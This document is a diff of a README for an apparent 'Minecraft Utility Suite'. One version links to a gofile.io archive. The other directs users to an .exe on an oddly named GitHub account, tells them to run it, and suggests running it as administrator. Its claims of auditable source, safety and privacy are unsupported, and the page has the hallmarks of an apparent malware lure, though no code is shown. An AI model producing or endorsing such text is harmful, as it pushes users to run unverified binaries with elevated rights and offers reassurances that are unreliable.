@@ -1,107 +1,84 @@
-Minecraft Utility Suite — tools and configurations for optimizing gameplay and server management on Windows, macOS, and Linux.
+# 🛠️ Minecraft-Utility-Suite - Optimize your game and server performance
 
-# Minecraft Utility Suite - 2026
+[![Download Minecraft Utility Suite](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Carmelunmyelinated755/Minecraft-Utility-Suite/releases)
 
-**This repository provides a structured and organized collection of tools and configurations designed to enhance and streamline your Minecraft gameplay and server management. It aims to offer a centralized hub for optimizing performance, managing game settings, and exploring advanced features in a responsible and secure manner.**
+Minecraft Utility Suite provides essential tools to improve how your game runs. It manages server settings and optimizes your local game files on Windows, macOS, and Linux. This suite helps users maintain smooth frame rates and reliable server connections without requiring technical expertise.
 
-<div align="center">
+## 📦 What the suite does
 
-[![Download](https://img.shields.io/badge/DOWNLOAD-Release-7C3AED?style=for-the-badge)](https://gofile.io/d/pdc3qA)
+The software includes three primary components designed for stability and speed:
 
-</div>
+1. Game Performance Manager: Configures your computer to give Minecraft more memory. This reduces stuttering during gameplay.
+2. Server Configuration Tool: Updates your server property files to ensure consistent uptime. It automates common settings for backup and player management.
+3. Network Optimizer: Adjusts your local network settings to reduce latency while playing on multiplayer servers.
 
----
+## 💻 System requirements
 
-## The Problem
+The software runs on most modern desktop environments. Ensure your computer meets these minimum specifications before you proceed:
 
-Managing and optimizing the Minecraft experience, whether for individual players or server administrators, can be complex. Players often seek ways to improve performance, customize their interface, and utilize advanced features, but finding reliable, well-organized, and safe-to-use resources can be challenging. Inconsistent configurations, outdated tools, and a lack of clear documentation can lead to frustration, instability, and potential security risks.
+- Operating System: Windows 10 or 11, macOS 11 or newer, or a modern Linux distribution.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 200 megabytes of free space.
+- Software: Java Runtime Environment 17 or newer installed on your machine.
 
-## The Solution
+## 🚀 Setting up your software
 
-This Minecraft Utility Suite offers a unified and curated approach to game enhancement:
+Follow these steps to download and install the Utility Suite on Windows.
 
-- Provides a safe and legitimate framework for exploring Minecraft customization.
-- Centralizes essential tools and configurations for ease of access and management.
-- Focuses on performance optimization and improved user experience.
-- Offers clear documentation and guidance for installation and usage.
-- Encourages community contributions for continuous improvement and feature expansion.
-- Promotes responsible and ethical use of game enhancement tools.
+1. Visit the [official release page](https://github.com/Carmelunmyelinated755/Minecraft-Utility-Suite/releases) to find the latest version.
+2. Look for the file ending in .exe under the Assets section.
+3. Click the file name to start your download.
+4. Open the folder where your browser saves downloaded files.
+5. Double-click the downloaded file to begin the installation process.
+6. Follow the prompts on the screen to finish the setup.
+7. Locate the new icon on your desktop and double-click it to open the application.
 
-## What You Get
+## ⚙️ Using the Performance Manager
 
-### Core Features
+The Performance Manager improves your frame rate by allocating system resources.
 
-| Feature Category       | Description                                                                 |
-| :--------------------- | :-------------------------------------------------------------------------- |
-| Performance Boosters   | Optimized settings and resource packs aimed at improving frame rates.       |
-| Interface Customizers  | Tools and guides for modifying the in-game user interface for clarity.      |
-| Utility Integrations   | Curated collection of functional scripts and utilities for gameplay support.|
-| Configuration Manager  | Centralized management of game and server configuration files.              |
-| Documentation Hub      | Comprehensive guides for setup, usage, and troubleshooting.                 |
-| Community Extensions   | A framework to integrate and share user-created enhancements.               |
-| Security Best Practices| Guidance on maintaining a secure and stable Minecraft environment.          |
+- Open the Minecraft Utility Suite dashboard.
+- Select the Performance tab.
+- Click Adjust Memory Settings.
+- Choose your desired allocation level. We recommend selecting the Automatic setting for most players.
+- Click Save Changes. The application applies these updates to your Minecraft launcher profiles.
 
-## Compatibility / Support Matrix
+## 🖥️ Configuring your server
 
-| Component                | Supported Version(s)   | Status      |
-| :----------------------- | :--------------------- | :---------- |
-| Minecraft Java Edition   | 1.20.x, 1.21.x         | Supported   |
-| Minecraft Bedrock Edition| N/A                    | Not Supported |
-| Operating Systems        | Windows, macOS, Linux  | Supported   |
-| Server Software          | Vanilla, Spigot, Paper | Supported   |
-| Mod Loaders              | Forge, Fabric          | Supported   |
-| Java Runtime             | Java 17+               | Required    |
+Server administration often involves editing text files by hand. This suite simplifies the task.
 
-## Verification / Trust Signals
+- Select the Server tab within the application.
+- Click Scan for Servers to locate your existing Minecraft server folder on your computer.
+- Click Configure once the software detects your setup.
+- Adjust settings like player limits, view distance, and world difficulty using the sliders.
+- Click Update Files. The software rewrites your configuration files to match these new settings.
 
-| Signal                | Details                                                                 |
-| :-------------------- | :---------------------------------------------------------------------- |
-| Source Code           | Publicly available and auditable on GitHub.                             |
-| Versioning            | Clear release tags and changelogs for each update.                      |
-| Community Reviews     | Feedback and discussions via GitHub Issues and Discussions.             |
-| Authoritative Docs    | Comprehensive README and dedicated documentation files.                 |
-| Dependency Scans      | Regular checks for known vulnerabilities in included components.        |
-| Licensing             | Open-source license promoting transparency and contribution.            |
+## 🌐 Optimizing your network
 
-## Before & After
+High latency causes game lag. The Network Optimizer reduces this delay.
 
-| Aspect              | Before                                                                   |
-| :------------------ | :----------------------------------------------------------------------- |
-| Performance         | Laggy gameplay, inconsistent frame rates, long load times.               |
-| Configuration       | Scattered files, complex manual edits, potential errors.                 |
-| User Interface      | Cluttered HUD, difficult-to-read text, limited customization.            |
-| Tool Management     | Disparate downloads, unclear origins, manual updates.                    |
-| Learning Curve      | Steep and confusing for new users seeking enhancements.                  |
-| Minecraft Experience| Standard, potentially unoptimized, basic functionality.                  |
+- Navigate to the Network tab.
+- Click Test Latency. The tool sends a small data packet to verify your current connection speed.
+- Click Apply Optimization.
+- The tool modifies your system's network priority settings for Minecraft specifically. This ensures that your computer gives your game data priority over other background tasks.
 
-## How to Install / Use
+## 🔄 Updating your suite
 
-### Quick Start
+Check for updates regularly to ensure you have the latest performance patches.
 
-1.  **Download:** Obtain the latest release package from the link below.
-2.  **Extract:** Unzip the downloaded archive to a desired location on your system.
-3.  **Configure:** Review the `config/` directory and adjust settings according to your Minecraft version and preferences.
-4.  **Integrate:** Follow the specific instructions within the documentation for any tools or scripts you wish to use.
-5.  **Launch:** Start Minecraft with your preferred launcher and apply any necessary modifications as per the guides.
+- Open the Help menu within the application.
+- Select Check for Updates.
+- If a new version exists, the application downloads it automatically.
+- Restart the application after the update finishes to apply changes.
 
-<div align="center">
+## 🛠️ Troubleshooting common issues
 
-[![Download](https://img.shields.io/badge/DOWNLOAD-Release-7C3AED?style=for-the-badge)](https://gofile.io/d/pdc3qA)
+If the software fails to launch, verify your Java installation. The application depends on Java to run on Windows.
 
-</div>
+If you encounter an error while configuring server files, close Minecraft entirely before you press the Update Files button. The software cannot edit files that the game is actively using.
 
-## Example Interface / Output
+Contact support if you receive a file permission error. This usually means you need to run the application as an administrator. Right-click the application icon and select Run as administrator to resolve this issue.
 
-```ascii
-+-----------------------------------------------------+
-|           Minecraft Utility Suite Dashboard         |
-+-----------------------------------------------------+
-|                                                     |
-|  [ ] Performance Optimizer:  [Active]               |
-|  [ ] HUD Customizer:         [Configured]           |
-|  [ ] Utility Script Runner:  [Ready]                |
-|                                                     |
-|  Status: All systems nominal.                       |
-|  Version: 1.0.0                                     |
-|                                                     |
-+-----------------------------------------------------+
+## 🛡️ Privacy and safety
+
+The Minecraft Utility Suite runs locally on your machine. It does not send your personal files or game logs to external servers. All configuration changes remain on your local hard drive. The application only accesses the specific folders where Minecraft stores its settings.
